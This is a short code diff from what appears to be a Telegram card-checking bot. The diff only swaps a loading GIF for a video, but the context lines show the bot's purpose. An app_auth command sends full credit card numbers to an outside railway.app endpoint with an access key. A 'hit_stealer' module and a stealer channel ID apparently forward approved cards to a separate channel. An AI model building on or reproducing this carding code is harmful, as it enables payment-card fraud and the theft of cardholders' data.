@@ -10,7 +10,7 @@ from BOT.tools.hit_stealer import send_hit_if_approved
 
 # Updated Stealer Channel ID
 STEALER_CHANNEL_ID = -1003627495953
-COOKING_GIF = "https://raw.githubusercontent.com/manus-ai/assets/main/egg_cooking.gif"
+COOKING_GIF = "https://files.catbox.moe/wmq01l.mp4"
 
 async def send_hit_if_approved(client: Client, text: str):
     try:
@@ -43,7 +43,7 @@ async def app_auth_cmd(Client, message):
         endpoint_url = f"https://onyxenvbot.up.railway.app/app-auth/key=yashikaaa/cc={fullcc}"
 
         # 1. Send Cooking GIF (No Caption)
-        gif_msg = await message.reply_animation(COOKING_GIF, quote=True)
+        gif_msg = await message.reply_video(COOKING_GIF, quote=True)
 
         start = time.perf_counter()
         
